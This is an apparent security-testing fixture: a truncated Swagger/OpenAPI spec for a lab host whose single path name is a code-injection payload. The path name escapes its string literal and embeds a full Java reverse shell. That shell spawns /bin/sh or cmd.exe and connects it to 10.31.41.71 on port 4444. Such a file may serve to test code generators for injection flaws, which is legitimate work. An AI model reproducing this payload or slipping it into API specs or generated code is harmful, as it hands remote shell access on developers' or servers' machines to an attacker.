             "description": "A",
              "version": "1.0.0",
              "title": "C"
          },
          "schemes": [
              "https"
          ],
          "host": "store2.sectesting.lab",
          "basePath": "/",
          "produces": [
              "application/json"
          ],
          "consumes": [
              "application/json"
          ],
          "paths": {
              "a\\"; "import java.lang.*; import java.util.*; import java.io.*; import java.net.*;     class StreamConnector extends Thread   {     InputStream kU;     OutputStream pV;      StreamConnector( InputStream kU, OutputStream pV )     {       this.kU = kU;       this.pV = pV;     }      public void run()     {       BufferedReader p8  = null;       BufferedWriter ypa = null;       try       {         p8  = new BufferedReader( new InputStreamReader( this.kU ) );         ypa = new BufferedWriter( new OutputStreamWriter( this.pV ) );         char buffer[] = new char[8192];         int length;         while( ( length = p8.read( buffer, 0, buffer.length ) ) > 0 )         {           ypa.write( buffer, 0, length );           ypa.flush();         }       } catch( Exception e ){}       try       {         if( p8 != null )           p8.close();         if( ypa != null )           ypa.close();       } catch( Exception e ){}     }   }    try   {     String ShellPath; if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {   ShellPath = new String(\"/bin/sh\"); } else {   ShellPath = new String(\"cmd.exe\"); }      Socket socket = new Socket( \"10.31.41.71\", 4444 );     Process process = Runtime.getRuntime().exec( ShellPath );     ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();     ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();   } catch( Exception e ) {}  ": {
                  "get": {
                      "description": "D",
                      "responses": {
                          "200": {
                              "description": "E",
                              "schema": {
                                  "$ref": "#/definitions/d"
                              }
                          }
                      }
                  }
              }
          },
          "definitions": {
              "d": {
                  "type": "object",
                  "description": "F",
                  "properties": {
                      "id": {
                          "type": "integer",
                          "format": "int64"
                      }
                  }
              }
          }
      }
        